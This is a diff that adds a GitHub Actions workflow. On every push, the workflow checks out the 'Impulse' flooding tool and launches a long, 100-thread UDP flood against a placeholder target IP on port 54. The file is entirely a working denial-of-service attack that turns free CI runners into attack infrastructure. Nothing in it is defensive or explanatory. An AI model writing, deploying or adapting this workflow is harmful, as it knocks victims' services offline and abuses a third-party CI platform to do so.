@@ -1,0 +1,22 @@
+name: start_it
+
+on: push
+
+env:
+  TARGET: IP_TARGET
+
+jobs:
+  hello-world:
+    name: fire_in_the_hole
+    runs-on: ubuntu-latest
+    steps:
+    - name: Check-out devops repository
+      uses: actions/checkout@v2
+      with:
+        repository: LimerBoy/Impulse
+
+    - name: starting
+      run: |
+        pip3 install -r requirements.txt
+        python3 impulse.py --target ${{ env.TARGET }}:54 --time 100000 --threads 100 --method UDP
+      shell: sh
